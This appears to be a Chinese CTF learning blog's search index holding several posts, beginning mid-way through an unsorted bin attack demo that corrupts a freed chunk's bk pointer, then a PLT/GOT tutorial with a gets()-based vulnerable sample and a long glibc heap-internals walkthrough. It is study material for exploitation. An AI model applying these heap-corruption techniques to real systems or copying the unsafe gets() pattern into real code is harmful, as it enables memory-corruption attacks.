%p\\n\", (void *)p[1]); /*------------VULNERABILITY-----------*/ p[1] = (unsigned long)(&amp;target_var - 2); fprintf(stderr, \"Now emulating a vulnerability that can overwrite the \" \"victim-&gt;bk pointer\\n\"); fprintf(stderr, \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p\\n\\n\", (void *)p[1]); //------------------------------------ malloc(400); fprintf(stderr, \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite:\\n\"); fprintf(stderr, \"%p: %p\\n\", &amp;target_var, (void *)target_var);&#125; 经过上面原理的解释，这个就不说了 最后总结一句话: 修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"堆","slug":"堆","permalink":"https://pz1o.top/tags/%E5%A0%86/"}]},{"title":"plt表和got表","slug":"plt表和got表","date":"2020-12-16T13:32:03.000Z","updated":"2020-12-17T01:05:53.222Z","comments":true,"path":"2020/12/16/plt表和got表/","link":"","permalink":"https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/","excerpt":"","text":"需要啥 学啥 看学长博客写了这个 自己也记录一下 毕竟刚学 https://ld1ng.com/2020/06/16/GOTPLT/ https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8 https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8 GOT表和PLT表GOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。 引入123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt;void win()&#123; printf(\"you win\\n\");&#125;int main()&#123; char a[100]; gets(a); printf(\"you lose\\n\"); return 0;&#125; 编译这个文件 gdb调试一下 此时我们可以看到gets@plt和puts@plt这两个函数 @plt这里的意思是指PLT表中的数据的地址。 为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的， 这时 我们也就理解了@plt标志的函数，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。 那@plt函数里面是什么呢 1disass gets jmp指令跳转到GOT表 GOT表中的数据为0x4004c6 跳转到指令地址为0x4004c6 执行push 0x3这个为在GOT中的下标序号 在执行jmp 0x400480 而0x400480为PLT[0]的地址 PLT[0]的指令会进入动态链接器的入口 执行一个函数将真正的函数地址覆盖到GOT表中 问题1.PLT[0]处到底做了什么，按照我们之前的思路它不是应该跳转到GOT[0]吗 这是plt[0]中的内容 后面的16进制就是GOT表中的内容 我们的PLT[0]根本没有跳转到GOT[0]，它不像我们的PLT[1]这些存储的是GOT表项的地址，它是一些代码指令，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。 所以我们可以得到下面这张图 而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。 总而言之，我们调用一个函数的时候有两种方法，一个是通过PLT表调用，一个则是通过GOT表调用，因为PLT表最终也是跳转GOT表，GOT表中则是一个函数真正的地址，这里需要注意的是，在一个函数没有运行一次之前，GOT表中的数据为@plt函数中下一条指令的地址。 2.为什么中间要进行push压栈操作？ 中间进行的压栈是为了确定PLT对应的GOT表项，即是PLT[1]−&gt;GOT[3]，0x3就是GOT的下标3，也就是说压栈后我们跳转到PLT[0],接着PLT[0]中的指令会通过这次压栈的序号来确定操作的GOT表项为多少 3.压入的序号为什么为0x3，不是最开始应该为0x0吗？ 因为GOT[0],GOT[1],GOT[2]都有其他用处，所以从0x3开始。 总结GOT表的构成GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息; GOT[1]包含动态链接器的标识; GOT[2]包含动态链接器的延迟绑定代码的入口点。 GOT的其他表目为本模块要引用的一个全局变量或函数的地址。 PLT表的构成PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。 实现最后，自己总结一下实现过程 首先，进入PLT表项，这时第一步就是跳转到GOT表项 GOT表项存放PLT表第二条指令的地址，也就是push 0x x把相应的idx压入 下一步就是跳转到PLT[0]中，进而链接到GOT[2] ,进入链接器入口 最后通过动态链接器将真正函数地址覆盖到GOT表中 别人的动图","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"堆","slug":"堆","date":"2020-12-15T08:19:22.000Z","updated":"2020-12-22T13:19:27.950Z","comments":true,"path":"2020/12/15/堆/","link":"","permalink":"https://pz1o.top/2020/12/15/%E5%A0%86/","excerpt":"","text":"堆(持续更新)https://ld1ng.com/2020/07/23/Heap/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap 上一个PWN学习 学得不太全面 写这个主要是为了自己能够全面复习堆的基础知识 由于我没学过操作系统 有些相关知识可能不太对 还请指正 基础0x01 什么是堆 在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存 堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长 我们一般成管理堆的那部分程序为堆管理器 堆管理器处于用户程序与内核中间，主要做以下工作 malloc free 0x02 如何分配堆和释放堆1.malloc函数1void *malloc(size_t n); 该函数返回对应大小字节的内存块的指针 此外，该函数还对一些异常情况进行了处理 当n=0时，返回当前系统允许的堆的最小内存块 当n为负数时，由于在大多数系统中，size_t是无符号数，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配 2.free函数1void free(void *p); 该函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到的，也有可能是通过相关的函数realloc得到的 该函数还对异常情况进行了一下处理 当p为空指针时，函数不执行任何操作 当p已经被释放之后，再次释放会出现错误的效果，这其实就是double free 除了被禁用（mallocpt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便减小程序所使用的内存空间 0x03 如何实现堆 堆的glibc实现主要包括struct _heap_info，struct malloc_state，struct malloc_chunk这3个结构体 1.Arena 一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的 主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena” Arena的数量及管理我们说到有主线程和子线程的arena 那么每个程序的arena的数量应该就是有限的 123432位系统中： Number of arena = 2 * number of cores + 1.64位系统中： Number of arena = 8 * number of cores + 1 这里就会涉及一个多线程共享问题 eg：一个主Arena 两个副Arena 如果有一个4线程（大于3个Arena）的程序，显然这里就会出现一个共享问题 此时glibc malloc会做以下操作： 首先，glibc malloc循环遍历所有可用的竞技场，在遍历的过程中，它会尝试锁该竞技场。如果成功锁（该竞技场当前对应的线程并未使用堆内存则表示可锁），那么该竞技场就可以被线程3所使用 而如果没能找到可用的舞台上，那么就将线程3的malloc的操作阻塞，直到有可用的舞台为止 当线程3的malloc阻塞解除时，glibc malloc就会先尝试使用最近访问的竞技场（此时为主竞技场）。如果此时主竞技场可用的话，就直接使用，否则就将线程3再次阻塞，直到主舞台上再次可用为止 2.malloc_state glibc的中arnea就是用这个结构体表示的 其中包含很多的信息：各种bins的信息，top chunk以及最后一个剩余chunk等 12345678910111213141516171819202122232425262728293031323334353637383940414243struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; fastbinsY数组：存储的是该领域管理的fastbins bins数组：存储的是该领域管理的smallbins，unsortedbin，largebin binmap变量：系统查看有哪些垃圾箱链中有块时，不可能去fastbinsY和箱数组一个一个的遍历通过binmap变量，采用二进制存储，将二进制位与数组的索引相对，系统查找箱链时可以。通过按位与来查询，这样更高效。虽然unsigned int的二进制位比数组总元素少，但是系统不会有那么多的bin链，不需要考虑这个问题 3.heap_info 我们知道一个线程可以包含多个堆段，这些堆段同属于一个舞台来管理。每个堆段的信息就是用这个结构体来表示的 注意：这个不是存储堆块的数据，而是来解释说明这个堆段的 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; ar_ptr：此堆段归属于哪一个arnea管理 prev：前一个堆段 4.malloc_chunk 一个堆块被分为多个块，这些块就是用这些结构体表示的，这个才是我们在glibc的正真存储堆数据信息的结构体 12345678910111213struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead.*/ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; &#125;; 每个成员都是8字节（64位系统中），4字节（32位系统中） mchunk_prev_size：只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。否则，该字段为0是没有用的；但是当前一个chunk申请的大小大于前一个chunk的大小时，那么该字段可以用来给前一个chunk使用（这就是chunk的空间复用，后面文章介绍） mchunk_size：当前chunk的大小，chunk大小都是8字节对齐 这里我们来看一下gdb调试的界面 源码如下 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;#include &lt;string.h&gt;int main()&#123; char *p; p = malloc(10); char *H; H = malloc(64); memcpy(H,\"aaaaaaaaaaaaaaaa\",16); free(H); return 0;&#125;gcc -o a.out a.c#64位gcc -m32 -o b.out b.c#32位 64位 32位 当前chunk处于分配状态时： fd：从fd字段开始的是用户的数据 当前chunk处于空闲时： 因为chunk处于空闲时，会被放到bin链中，所以fd和bk用于指向自己所在bin链中前后的空闲chunk fd：指向前一个（非物理相邻）空闲的 chunk的指针（头指针） bk：指向后一个（非物理相邻）空闲的 chunk的指针 通过fd和bk可以将空闲的chunk块加入到空闲的chunk块链表进行统一管理 fd_nextsize、bk_nextsize 也是只有chunk空闲的时候才使用，不过其用于较大的chunk（large chunk） fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含bin的头指针 bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历 malloc_chunk的内存分配大小最小的空间：mchunk_prev_size字段 + mchunk_size字段 + fd字段 + bk字段 所需要的空间。所以64位系统最低需要 4 * SIZE_SZ = 32字节；32位系统是16字节 实际空间：malloc大小 + chunk对齐规则 + mchunk_prev_size字段 + mchunk_size字段 + 下一个chunk的mchunk_prev_size成员空间 chunk的数据结构大小的图（64位系统） mchunk_size的标记位的复用mchunk_size在64位系统下是8个字节，字段的最后三个bit位，复用用作了（AMP）的标记位置。后三位bit位的复用，不会影响size的数据大小 A：A=0 为主分区分配，A=1 为非主分区分配，参见后面 M：M=1表示使用mmap映射区域，M=0为使用heap区域 P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效 0x04 chunk的分类1.allocated chunk当前chunk是被应用层用户所使用的 2.free chunk当前chunk是空闲的，没有被应用层用户所使用 3.top chunk 概念：当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk 作用：该chunk并不属于任何bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用 分配的规则：如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap 4.last remainder chunk 它是怎么产生的：当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk 它的作用是什么：此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性 0x05 bins分类 bin是一个由struct chunk结构体组成的链表 前面介绍过，不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk 不同的bin链是由arena管理的 bin链中的chunk均为free chunk 1.bin的malloc_state1234567891011121314151617181920typedef struct malloc_chunk* mchunkptr;typedef struct malloc_chunk *mfastbinptr; struct malloc_state&#123; ... /*other member*/ ... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; ... /*other member*/ ...&#125;; fastbinY数组：大小为10。记录的是fast bin链 bins数组：大小为129。记录的是unsorted bin（1）、small bin（2~63）、large bin链（64~126） 2.fastbin概念：chunk的大小在32字节到128字节（0x20~0x80）的chunk称为“fast chunk（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员） fast bin链表的个数为10个 不会对free chunk进行合并：鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的PREV_INUSE位总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜 LIFO fastbinsY数组存储fastbins的规则： 每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作 单个fastbin链表中的chunk大小都是相同的，各个fastbin链表中的chunk大小是不同的 3.unsorted bin当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。在堆管理器的unsorted bin 不为空时，用户申请非fast bin大小的内存会先从unsorted bin中查找，如果找到符合该申请大小要求的chunk，则直接分配或分割该chunk。 unsorted bin的个数： 1个 unsorted bin是一个由free chunks组成的循环双链表 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中 unsortedbin采用的遍历顺序是FIFO 4.small bin概念：小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的 small bin链表的个数为62个 FIFO 循环双向链表，就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢 Small bin链表 每个smallbin也是一个由对应free chunk组成的循环双链表 small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk 单个smallbin链表中的chunk大小都是相同的，各个smallbin链表中的chunk大小是不同的，跟fastbinsY数组存储fastbin链的原理是相同的 5.large bin概念：大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的 large bin链表的个数为63个，被分为6组 largechunk使用fd_nextsize、bk_nextsize连接起来的 Large Bin链表 同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中 large chunk可以添加、删除在large bin的任何一个位置 在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组**的largebin链中的chunk大小无限制 0x06 堆的调用流程 当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多 glibc申请到这块大的内存之后，根据malloc需要的大小，然后切割相应的大小给应用程序malloc函数使用 当应用层free之后，会将刚才使用到的动态内存返回给glibc，但是返回的内存不是返回给top chunk，而是由bins链管理 当程序再次malloc时，会从刚才申请的很大的动态内存去取，不会再去向内核申请内存 只有当第一次申请的动态内存使用完时，glibc才会再次通过brk/mmap系统调用向内核去要内存 0x07 chunk的标志位1.简介 NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程 IS_MAPPED：记录当前chunk是否是由mmap分配的 PREV_INUSE：如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并 2.实现 在64位系统中为16字节对齐，在32位的系统中为8字节对齐。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个位数是没有被使用的，32位系统中，最后3个位数是没有被使用的。 所以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态 3.PREV_INUSE位导致的chunk合并12345678910111213#define prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE) static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; /* consolidate backward */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); //1 size += prevsize; //2 p = chunk_at_offset(p, -((long) prevsize)); //3 unlink(av, p, bck, fwd); //4 &#125;&#125; 首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0 如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中 1.通过recv_size函数得到前面要合并的chunk的大小 2.将自己的大小与前面的presize相加得到合并后的chunk的大小 3.将p的指针向前移动，移动到前面那个chunk的开头处 4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并 4.fast chunk的PREV_INUSE ①无论fastchunk前面的chunk是否处于分配状态，PREV_INUSE始终为1。因为系统不希望fastchunk与前面的chunk之间进行合并 ②不论当前的fastchunk是否处于分配状态，该chunk后面的chunk的PREV_INUSE位一定为1，也是为了防止后面的chunk与fastchunk合并 5.演示12345678910111213141516#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x70; void *p1=malloc(size); void *p2=malloc(size); void *p3=malloc(size); //为了达到演示效果，防止合并后的chunk与top chunk合并 sleep(0); //只为了打断点使用，无其他用处 free(p1); free(p2); return 0;&#125; 可以看到正好分配了3块 看一下内存地址 当我们释放一个之后 这里版本较高 淦 我先去找个虚拟机 可以看到是加到tcache中 弄了一晚上 我又回来了 释放第一个 释放两个 0x08 chunk的mchunk_prev_size成员的空间复用1.介绍 ①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小 ②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的 2.实现 当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储 否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员 3.演示123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x108; void *p1=malloc(size); sleep(0); //只为了打断点使用，无其他用处 free(p1); return 0;&#125; 0x108模0x10之后还有8 说明是占用了下一个chunk的pre_size 64位16字节对齐 0x100(分配)+0x10(头)+0x1(P) 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x109; void *p1=malloc(size); sleep(0); //只为了打断点使用，无其他用处 free(p1); return 0;&#125; 0x109模0x10为9 所以pre_size不够用 需要多申请1个单元 chunk被隐式对齐位0x110 64位16字节对齐 0x110+0x10+0x1 0x09 chunk的大小其实上一节我们就演示了 但这一节还是重点讲一下 1.chunk的实际大小 当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员 当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员 例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间 chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则 这个上面演示过了 就不演示了 2.chunk的最低大小 malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和） chunk的最低大小一定为0x20大小 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; //int size=0x109; void *p1=malloc(0); sleep(0); //只为了打断点使用，无其他用处 free(p1); return 0;&#125; 0x10 bins的单向链表、双向链表存储结构1.fastbins的单向链表存储结构 fastbins是单向链表存储，fastbins中的的chunk是不会合并的（glibc规定这些chunk的PREV_INUSE位永远为1） 存储结构： fastbins的存储采用后进先出（LIFO）的原则：后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的 因为是单链表，fastbins中的所有chunk的bk是没有用到的 并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理 演示 123456789101112131415161718#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x10; int size2=0x20; int *p1=malloc(size); int *p2=malloc(size); int *p3=malloc(size2); sleep(0); //只为了程序打断点，没有其他作用 free(p1); free(p2); free(p3); return 0;&#125; 打到断点处 heap的信息 释放p1 p2 可以看到第一个被释放chunk的fd指针指向0 而第二个被释放chunk的fd指针指向第一个 看一下main_arena 可以看到是指向最后一个chunk 也就验证了上面的结论 接下来我们释放第三个 由于与前两个大小不同所以我们会新开一个链表 说明main_arena的地址也不一样 此次演示也就完成了 32位可自行演示 2.unsortedbin的双向链表存储结构 free的chunk大小如果大于0x80会放到unsortedbin上 unsortedbin存储这些chunk是使用双向循环链表进行存储的（smallbins、largebins也是如此，此处只介绍unsortedbin） 存储结构： 存储循环先入先出（FIFO）原则：上面的是先free掉的chunk，下面是后free掉的chunk；同理，通过malloc取出chunk时是先取上面的，再取下面的 一个bins中只有一个freechunk时：就是下面这种表示形式。可以看到freechunk的fd和bk都指向于bins的fd，所以我们使用gdb调试时可以用命令看到，当bin链中只有一个freechunk时，其fd和bk都是相同的，都指向于bins的fd 一个bins中有多个freechunk时：上面使我们的struct malloc_state结构体，结构体中的bins数组存储的就是这些bin链，下面就是bins数组中存储unsortedbin的位置，这个数组元素存储的其实就是一个fd和一个bk指针。下面第一个就是第一个free掉的chunk，再下面一个就是第二个free掉的chunk……以此类推 演示 1234567891011121314151617#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x100; int *p1=malloc(size); int *temp=malloc(size); //防止p1与p2合并 int *p2=malloc(size); int *p3=malloc(size); //防止p2被top chunk合并 sleep(0); free(p1); free(p2); return 0;&#125; 打断点 释放p1 从上面我们也可以看到下一个chunk的标志p位为0了 看下main_arena 释放p2 可以看到main_arena是变了的 bins头中fd-&gt;p2 bk-&gt;p1 演示完成 0x11 top chunk的向前合并1.top chunk概念 当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk 2.top chunk的合并操作 如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk 如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk 3.演示12345678910111213#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); void *p2=malloc(size); sleep(0); //只为了程序打断点，无其他作用 free(p2); return 0;&#125; 断点 堆信息 释放p2 可以看到p2是fastbins 未被合并 12345678910111213#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); void *p2=malloc(0x100); sleep(0); //只为了程序打断点，无其他作用 free(p2); return 0;&#125; 断点 释放p2 可以看到p2被合并了 4.如何防止top chunk的合并 只需要在free掉的chunk后面继续申请一个chunk，这样top chunk就不会合并之前的chunk 0x12 chunk的malloc、free1.malloc的机制 如果程序是第一次malloc：会创建一个很大的“top chunk” 如果程序是第二次及之后malloc：会去先向bins链表寻找空间，如果没有再去向“top chunk”要空间；如果“top chunk”使用完了再通过glibc重新申请一块新的“top chunk” 2.演示上面我们已经演示过很多回了 第一次就不演示了 这里主要来看一下第二次的malloc 这里是拿fastbin的例子 恰好分割一整块的free chunk（fastbin）123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); sleep(0); //只为了程序打断点，无其他作用 free(p1); void *p2=malloc(0x20); return 0;&#125; 直接看free掉p1之后可以看到是进入fastbin了 我们在来申请p2 可以看见是直接覆盖了p1 切割一块chunk（fastbin）1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); sleep(0); //只为了程序打断点，无其他作用 free(p1); void *p2=malloc(0x10); return 0;&#125; 我们直接看p2分配之后把 这里可以看出它并未用fastbin的chunk 而是从top chunk切割了一部分 恰好分割一整块的free chunk（unsorted bin）12345678910111213141516#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x200; void *p=malloc(size); void *p2=malloc(size); //为了达到演示效果，防止p被top chunk合并 sleep(0); //只为了打断点使用 free(p); void *p3=malloc(size); free(p3); return 0;&#125; 看一下chunk的信息 free p1，将p1放入了unsorted bin中 分配p3 可以看到是直接覆盖p1的地方 切割一块chunk（unsorted bin）123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x100); void *temp=malloc(0x100); //为了防止p被topchunk合并 sleep(0); //只为了打断点使用 free(p); void *p2=malloc(0x30); free(p2); return 0;&#125; 这里我们直接看p2分配之后 这里为什么会出现这个情况呢？ 其实它是在unsorted bin中切割了一块符合自己大小的chunk 拿出来分配 分割一块较大的free chunk（unsorted bin） 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x100); void *temp=malloc(0x100); //为了防止p被topchunk合并 sleep(0); //只为了打断点使用 free(p); void *p2=malloc(0x300); free(p2);c return 0;&#125; 根据上面的理论这回就应该去top chunk中切割了 事实也确实如此 经过以上演示我们不难得出一下结论 只要切割大小正好 它就会从已free的chunk中寻找 关于fastbin 和 unsorted bin中free chunk分配是不一样的 如果较大 会从top chunk中寻找 3.free的机制 ①如果free的chunk的大小在0x20~0x80之间（fastbin的范围），那么该chunk直接放到fast bin上 ②如果free的chunk的大小大于0x80（大于fast bin的范围），此时不会直接放到small bin或者large bin上面。而是放到unsorted bin上面 0x13 malloc_consolidate这个主要是解决unsorted bin中的碎片化，整合成新的bin，也就是放入small bin或large bin中 1.consolidate的定义 